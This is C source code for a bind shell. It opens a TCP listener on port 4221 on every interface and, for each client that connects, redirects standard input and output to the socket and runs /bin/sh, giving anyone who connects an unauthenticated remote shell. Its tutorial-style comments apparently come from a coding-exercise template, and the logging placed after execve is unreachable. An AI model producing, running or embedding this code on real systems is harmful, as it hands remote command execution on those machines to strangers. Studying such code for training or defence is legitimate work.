#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>

int main(void)
{
    int server_fd, client_fd;
    unsigned int client_addr_len;
    struct sockaddr_in client_addr;

    // We are gonna create a network socket.
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1)
    {
        printf("Socket creation failed: %s...\n", strerror(errno));
        return 1;
    }

    // Since the tester restarts your program quite often, setting SO_REUSEADDR
	// ensures that we don't run into 'Address already in use' errors
	int reuse = 1;
	if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse)) != 0)
    {
	 	printf("SO_REUSEADDR failed: %s \n", strerror(errno));
	 	return 1;
	}

    // we setup this struct here to use for socket.
    struct sockaddr_in serv_addr = { .sin_family = AF_INET,
                                    .sin_port = htons(4221),
                                    .sin_addr = { htonl(INADDR_ANY) },
                                    };                    
    
    // Now we assign a name to a socket using bind()
    if (bind(server_fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) != 0)
    {
        printf("Bind failed: %s\n", strerror(errno));
        return 1;
    }

    // Now we will listen to any incoming connection requests.
    int connection_backlog = 5;
    if (listen(server_fd, connection_backlog) != 0)
    {
        printf("Listen failed: %s\n", strerror(errno));
        return 1;
    }

    // We run an infinite loop so we can keep our program running and keep processing the connection requests.
    for (;;)
    {
        printf("Waiting for a client to connect...\n");
        client_addr_len = sizeof(client_addr);
        char ip_addr[INET_ADDRSTRLEN];
        client_fd = accept(server_fd, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_fd == -1)
        {
            printf("Connection failed: %s\n", strerror(errno));
            return 1;
        }

        // Using dup2() to redirect the stdin, stdout and stderr of our client file descriptor.
        for (size_t i = 0; i < 3; i++)
        {
            if (dup2(client_fd, i) == -1)
            {
                printf("Error duplicating file descriptor: %s\n", strerror(errno));
                close(client_fd);
                return 1;
            }
        }
        // I had to add these empty string as NULL to execve since it was giving error when passing NULL as second and third argument directly.
        char *arg1[] = {NULL};
        char *arg2[] = {NULL};
        if (execve("/bin/sh", arg1, arg2) == -1)
        {
            printf("Error on execve: %s\n", strerror(errno));
            return 1;
        }

        // This inet_ntop() is used to convert the binary representation of IP address to string.
        inet_ntop(client_addr.sin_family, (struct inaddr *) &client_addr.sin_addr, ip_addr, INET_ADDRSTRLEN);
        printf("Client connected.\n");
        printf("Connection from: %s\n", ip_addr);
    }
    // closing the file descriptors
    close(server_fd);
    close(client_fd);

    return 0;
}